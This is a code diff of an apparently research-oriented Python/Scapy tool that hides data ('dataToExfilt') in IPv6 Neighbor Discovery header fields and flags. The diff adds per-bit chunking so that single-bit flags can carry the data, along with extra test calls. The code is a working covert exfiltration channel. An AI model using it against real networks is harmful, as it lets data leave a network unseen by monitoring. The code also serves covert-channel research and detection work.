@@ -69,10 +69,11 @@ class AllCovertTests:
                 routerSol = RouterSolicitationCovert()
                 routerSol.execModule(self.dataToExfilt, '', self.iface, self.ipAddress)
                 routerSol.execModule('', self.dataToExfilt, self.iface, self.ipAddress)
-                #only tested 8 bit or more (no M,O,Reserved)
                 routerAdv = RouterAdvertisementCovert()
                 routerAdv.execModule(self.dataToExfilt, '', '', '', '', '', '', '', self.iface, self.ipAddress)
                 routerAdv.execModule('', self.dataToExfilt, '', '', '', '', '', '', self.iface, self.ipAddress)
+                routerAdv.execModule('', '', self.dataToExfilt, '', '', '', '', '', self.iface, self.ipAddress)
+                routerAdv.execModule('', '', '', self.dataToExfilt, '', '', '', '', self.iface, self.ipAddress)
                 #reserved field is 6 bit
                 #routerAdv.execModule('', '', '', '', self.dataToExfilt, '', '', '', self.iface, self.ipAddress)
                 routerAdv.execModule('', '', '', '', '', self.dataToExfilt, '', '', self.iface, self.ipAddress)
@@ -82,9 +83,11 @@ class AllCovertTests:
                 neighbSol.execModule(self.dataToExfilt, '', '', self.iface, self.ipAddress)
                 neighbSol.execModule('', self.dataToExfilt, '', self.iface, self.ipAddress)
                 neighbSol.execModule('', '', self.dataToExfilt, self.iface, self.ipAddress)                
-                #only tested 8 bit or more (no R,S,O)
                 neighbAdv = NeighborAdvertisementCovert()
                 neighbAdv.execModule(self.dataToExfilt, '', '', '', '', '', self.iface, self.ipAddress)
+                neighbAdv.execModule('', self.dataToExfilt, '', '', '', '', self.iface, self.ipAddress)
+                neighbAdv.execModule('', '', self.dataToExfilt, '', '', '', self.iface, self.ipAddress)
+                neighbAdv.execModule('', '', '', self.dataToExfilt, '', '', self.iface, self.ipAddress)                
                 neighbAdv.execModule('', '', '', '', self.dataToExfilt, '', self.iface, self.ipAddress)
                 neighbAdv.execModule('', '', '', '', '', self.dataToExfilt, self.iface, self.ipAddress)
                 redirect = RedirectCovert()
@@ -401,7 +404,7 @@ class RouterAdvertisementCovert:
         self.bandwidthReachTime = 4
         self.bandwidthRetransTimer = 4
         self.nameCode = 'Router Advertisement code '
-        self.nameCurHopLimit = 'Router Advertisement Cur Hop LImit '
+        self.nameCurHopLimit = 'Router Advertisement Cur Hop Limit '
         self.nameM = 'Router Advertisement M '
         self.nameO = 'Router Advertisement O '
         self.nameRes = 'Router Advertisement reserved '
@@ -417,10 +420,10 @@ class RouterAdvertisementCovert:
         self.packet = IPv6(dst=ipAdr)/ICMPv6ND_RA(chlim=chunk, routerlifetime=0)
 
     def buildPacketM(self, chunk, ipAdr):
-        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_RA(M=chunk)
+        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_RA(code=1, M=chunk, routerlifetime=0)
 
     def buildPacketO(self, chunk, ipAdr):
-        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_RA(O=chunk)
+        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_RA(code=2, O=chunk, routerlifetime=0)
 
     def buildPacketRes(self, chunk, ipAdr):
         self.packet = IPv6(dst=ipAdr)/ICMPv6ND_RA(res=chunk)
@@ -449,13 +452,13 @@ class RouterAdvertisementCovert:
                 send(self.packet, iface=exitIface, verbose=False)
         elif dataM:
             data = self.nameM+dataM
-            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthM, self.nameM)
+            sendingBuffer = HelperClass.chunkPacketsBit(data, self.bandwidthM, self.nameM)
             for chunk in sendingBuffer:
                 self.buildPacketM(chunk, ipAdr)
                 send(self.packet, iface=exitIface, verbose=False)
         elif dataO:
             data = self.nameO+dataO
-            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthO, self.nameO)
+            sendingBuffer = HelperClass.chunkPacketsBit(data, self.bandwidthO, self.nameO)
             for chunk in sendingBuffer:
                 self.buildPacketO(chunk, ipAdr)
                 send(self.packet, iface=exitIface, verbose=False)
@@ -546,13 +549,13 @@ class NeighborAdvertisementCovert:
         self.packet = IPv6(dst=ipAdr)/ICMPv6ND_NA(code=chunk)
 
     def buildPacketR(self, chunk, ipAdr):
-        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_NA(R=chunk)
+        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_NA(code=1, R=chunk)
 
     def buildPacketS(self, chunk, ipAdr):
-        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_NA(S=chunk)
+        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_NA(code=2, S=chunk)
 
     def buildPacketO(self, chunk, ipAdr):
-        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_NA(O=chunk)        
+        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_NA(code=3, O=chunk)        
 
     def buildPacketRes(self, chunk, ipAdr):
         self.packet = IPv6(dst=ipAdr)/ICMPv6ND_NA(res=chunk)
@@ -569,19 +572,19 @@ class NeighborAdvertisementCovert:
                 send(self.packet, iface=exitIface, verbose=False)
         elif dataR:
             data = self.nameR+dataR
-            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthR, self.nameR)
+            sendingBuffer = HelperClass.chunkPacketsBit(data, self.bandwidthR, self.nameR)
             for chunk in sendingBuffer:
                 self.buildPacketR(chunk, ipAdr)
                 send(self.packet, iface=exitIface, verbose=False)
         elif dataS:
             data = self.nameS+dataS
-            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthS, self.nameS)
+            sendingBuffer = HelperClass.chunkPacketsBit(data, self.bandwidthS, self.nameS)
             for chunk in sendingBuffer:
                 self.buildPacketS(chunk, ipAdr)
                 send(self.packet, iface=exitIface, verbose=False)
         elif dataO:
             data = self.nameO+dataO
-            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthO, self.nameO)
+            sendingBuffer = HelperClass.chunkPacketsBit(data, self.bandwidthO, self.nameO)
             for chunk in sendingBuffer:
                 self.buildPacketO(chunk, ipAdr)
                 send(self.packet, iface=exitIface, verbose=False)
@@ -671,6 +674,24 @@ class HelperClass:
         return sendingBuffer
 
     @classmethod
+    def chunkPacketsBit(self, data, maxPacketSize, messageAndField):
+        print '[*] %s' % messageAndField
+        maxP = float(format(maxPacketSize, '.2f'))/8
+        print '[*] bandwidth %s' % format(maxP, '.2f')
+        sendingBuffer = []
+        chunkNumber = 0
+        print '[*] size of data %d' % len(data)
+        chunks = [data[i:i+maxPacketSize] for i in range(0, len(data), maxPacketSize)]
+        for tmpChunk in chunks:
+            for c in tmpChunk:
+                bits = BitArray(uint=ord(c), length=8)
+                for bit in bits.bin:
+                    chunkNumber += 1
+                    sendingBuffer.append(int(bit))
+        print '[*] chunks %d' % chunkNumber
+        return sendingBuffer
+    
+    @classmethod
     def chunkPacketsToAddress(self, data, maxPacketSize, messageAndField):
         print '[*] %s' % messageAndField 
         print '[*] bandwidth %d' % maxPacketSize
@@ -694,7 +715,7 @@ class HelperClass:
                         tmpBit.append(firstBit + secondBit)
                     else:
                         tmpBit.append(firstBit)
-                    print "[*] tmpBit in hex is %s" % str(hex(int(tmpBit.bin, 2)))
+                    #print "[*] tmpBit in hex is %s" % str(hex(int(tmpBit.bin, 2)))
                     if c < (len(tmpChunk)-2):
                         tmpSendingBuffer += str(tmpBit.hex) + ':'
                     elif (c/2+1) < 7:
